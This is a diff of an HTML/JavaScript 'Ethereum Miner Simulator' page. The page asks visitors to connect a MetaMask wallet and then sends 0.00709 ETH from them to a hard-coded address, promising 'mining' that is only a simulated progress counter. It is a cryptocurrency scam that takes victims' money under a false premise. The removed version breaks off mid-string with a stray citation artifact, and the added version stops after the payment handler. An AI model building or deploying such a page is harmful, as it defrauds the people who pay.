@@ -1,208 +1,162 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethereum Miner Simulator</title>
-    <style>
-        body {
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: #1a1a1a;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-
-        h1 {
-            font-size: 2.5rem;
-            background: linear-gradient(45deg, #FFD700, #FFA500);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .coin {
-            width: 200px;
-            height: 200px;
-            position: relative;
-            transform-style: preserve-3d;
-            animation: rotate 3s infinite linear;
-        }
-
-        .coin-face {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            backface-visibility: hidden;
-            border-radius: 50%;
-        }
-
-        .coin-back {
-            transform: rotateY(180deg) scaleX(-1);
-        }
-
-        .coin-face img {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            object-fit: cover;
-        }
-
-        @keyframes rotate {
-            to { transform: rotateY(360deg); }
-        }
-
-        .button {
-            background-color: #4CAF50;
-            border: none;
-            color: white;
-            padding: 15px 32px;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 16px;
-            margin: 4px 2px;
-            cursor: pointer;
-            border-radius: 12px;
-        }
-
-        .button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: rgb(0,0,0);
-            background-color: rgba(0,0,0,0.4);
-            padding-top: 60px;
-        }
-
-        .modal-content {
-            background-color: #fefefe;
-            margin: 5% auto;
-            padding: 20px;
-            border: 1px solid #888;
-            width: 80%;
-        }
-
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-        }
-
-        .close:hover,
-        .close:focus {
-            color: black;
-            text-decoration: none;
-            cursor: pointer;
-        }
-
-        .progress-bar {
-            width: 100%;
-            background-color: #f3f3f3;
-            border-radius: 25px;
-            margin: 10px 0;
-        }
-
-        .progress-bar span {
-            display: block;
-            height: 20px;
-            border-radius: 25px;
-            background-color: #4CAF50;
-            width: 0;
-        }
-
-        .status {
-            margin-top: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ethereum Miner Simulator</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    h1 {
+      color: #333;
+    }
+    .eth-logo {
+      width: 100px;
+      height: 100px;
+      margin: 20px auto;
+      background-image: url('https://cryptologos.cc/logos/ethereum-eth-logo.png');
+      background-size: cover;
+      background-position: center;
+      border-radius: 50%;
+      animation: rotateLogo 5s linear infinite;
+    }
+    @keyframes rotateLogo {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background-color: #ccc;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    p {
+      font-size: 16px;
+    }
+    .progress-bar {
+      width: 100%;
+      height: 20px;
+      background-color: #e0e0e0;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+    .progress-bar span {
+      display: block;
+      height: 100%;
+      background-color: #76c7c0;
+      border-radius: 5px;
+    }
+  </style>
 </head>
 <body>
-
+  <div class="container">
     <h1>Ethereum Miner Simulator</h1>
-    <div class="coin">
-        <div class="coin-face">
-            <img src="https://appincoin.fra1.cdn.digitaloceanspaces.com/uploads/1745678681114-u5f72e.jpeg" alt="Coin Front">
-        </div>
-        <div class="coin-face coin-back">
-            <img src="https://appincoin.fra1.cdn.digitaloceanspaces.com/uploads/1745678681114-u5f72e.jpeg" alt="Coin Back">
-        </div>
+    <div id="wallet-info">
+      <button id="connect-btn">Connect Wallet</button>
+      <p id="wallet-address"></p>
     </div>
-
-    <button id="connectButton" class="button">Connect Wallet</button>
-    <button id="startButton" class="button" disabled>Start Mining</button>
-
-    <div id="status" class="status"></div>
-
-    <div id="paymentModal" class="modal">
-        <div class="modal-content">
-            <span class="close">&times;</span>
-            <h2>Payment Required</h2>
-            <p>To start mining, please confirm the payment of 0.00709 ETH to the following address:</p>
-            <p><strong>0xf1b3424bb282ee20e394717dcb4fe59fc67835e0</strong></p>
-            <p>After payment confirmation, mining will begin automatically.</p>
-            <button id="confirmPayment" class="button">Confirm Payment</button>
-        </div>
+    <div id="payment-info" style="display: none;">
+      <p>To start mining, please send 0.00709 ETH to the following address:</p>
+      <p><strong>0xf1b3424bb282ee20e394717dcb4fe59fc67835e0</strong></p>
+      <button id="confirm-payment-btn">Confirm Payment</button>
     </div>
+    <div id="mining-info" style="display: none;">
+      <p>Mining Progress: <span id="progress">0</span>%</p>
+      <div class="progress-bar">
+        <span id="progress-bar" style="width: 0%;"></span>
+      </div>
+      <button id="start-mining-btn" disabled>Start Mining</button>
+      <button id="stop-mining-btn" style="display: none;">Stop Mining</button>
+    </div>
+    <div class="eth-logo"></div>
+  </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-    <script>
-        const connectButton = document.getElementById('connectButton');
-        const startButton = document.getElementById('startButton');
-        const statusDiv = document.getElementById('status');
-        const paymentModal = document.getElementById('paymentModal');
-        const confirmPaymentButton = document.getElementById('confirmPayment');
-        const closeModal = document.getElementsByClassName('close')[0];
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script>
+    const connectBtn = document.getElementById('connect-btn');
+    const walletAddressDisplay = document.getElementById('wallet-address');
+    const confirmPaymentBtn = document.getElementById('confirm-payment-btn');
+    const startMiningBtn = document.getElementById('start-mining-btn');
+    const stopMiningBtn = document.getElementById('stop-mining-btn');
+    const progressDisplay = document.getElementById('progress');
+    const progressBar = document.getElementById('progress-bar');
 
-        let isConnected = false;
-        let isMining = false;
-        let minedAmount = 0;
-        let miningInterval;
+    let web3;
+    let userAccount;
+    let miningInterval;
+    let minedAmount = 0;
+    const targetAmount = 0.0099;
+    const miningRate = 0.00000000382; // ETH per second
+    const paymentAmount = 0.00709; // ETH
+    const paymentAddress = '0xf1b3424bb282ee20e394717dcb4fe59fc67835e0';
 
-        const PAYMENT_AMOUNT = 0.00709;
-        const MINING_RATE = 0.00000000382;
-        const TARGET_AMOUNT = 0.0099000;
-        const PAYMENT_ADDRESS = '0xf1b3424bb282ee20e394717dcb4fe59fc67835e0';
+    connectBtn.addEventListener('click', async () => {
+      if (window.ethereum) {
+        try {
+          web3 = new Web3(window.ethereum);
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          userAccount = accounts[0];
+          walletAddressDisplay.textContent = `Connected: ${userAccount}`;
+          document.getElementById('wallet-info').style.display = 'none';
+          document.getElementById('payment-info').style.display = 'block';
+        } catch (error) {
+          console.error('User denied account access');
+        }
+      } else {
+        alert('Please install MetaMask to use this feature');
+      }
+    });
 
-        connectButton.addEventListener('click', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const network = await window.ethereum.request({ method: 'eth_chainId' });
-                    if (network === '0x1') {
-                        isConnected = true;
-                        connectButton.textContent = 'Wallet Connected';
-                        startButton.disabled = false;
-                        statusDiv.textContent = `Connected to Ethereum Mainnet. Wallet Address: ${accounts[0]}`;
-                    } else {
-                        alert('Please switch to the Ethereum Mainnet.');
-                    }
-                } catch (error) {
-                    console.error(error);
-                    alert('Failed to connect wallet.');
-                }
-            } else {
-                alert('Please install MetaMask!');
-            }
-        });
+    confirmPaymentBtn.addEventListener('click', async () => {
+      try {
+        const balance = await web3.eth.getBalance(userAccount);
+        if (parseFloat(web3.utils.fromWei(balance, 'ether')) < paymentAmount) {
+          alert('Insufficient funds for payment');
+          return;
+        }
 
-        startButton.addEventListener('click', () => {
-            if (isConnected) {
-                paymentModal.style.display = 'block';
-            } else {
-                alert('Please connect your wallet
-::contentReference[oaicite:0]{index=0}
- 
+        const tx = {
+          from: userAccount,
+          to: paymentAddress,
+          value: web3.utils.toHex(web3.utils.toWei(paymentAmount.toString(), 'ether')),
+          gas: 21000,
+        };
+
+        await web3.eth.sendTransaction(tx);
+        alert('Payment confirmed. You can now start mining.');
+        document.getElementById('payment-info').style.display = 'none';
+        document.getElementById('mining-info').style.display = 'block';
+        startMiningBtn.disabled = false;
+      } catch (error) {
+        console.error('Payment failed:', error);
+        alert('Payment failed. Please try again.');
+      }
+    });
